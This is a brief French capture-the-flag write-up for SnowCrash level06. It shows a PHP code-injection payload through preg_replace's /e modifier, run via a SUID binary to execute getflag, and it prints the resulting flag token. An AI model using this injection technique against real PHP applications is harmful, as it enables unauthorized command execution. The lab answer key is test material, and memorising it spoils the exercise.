# Level 06 - Solution

## Étape 1 : Découverte des fichiers

On dispose de deux fichiers :
- `level06` : Un binaire SUID
- `level06.php` : Un script PHP contenant le code vulnérable

### Analyse du binaire

Décompiler le binaire avec [Dogbolt](https://dogbolt.org). Le binaire exécute le script PHP avec les privilèges de `flag06`.

## Étape 2 : Exploitation

### Créer le fichier malveillant

```bash
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/attaque.txt
```

on utilise cela pour que le pregreplace avec l'option \e execute ce bout de code car il ya une regex qui check le format qu'on lui donne 

### Exécuter le binaire avec le fichier malveillant

```bash
level06@SnowCrash:~$ ./level06 /tmp/attaque.txt
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## Résultat

**Flag** : `wiok45aaoguiboiki2tuin6ub`

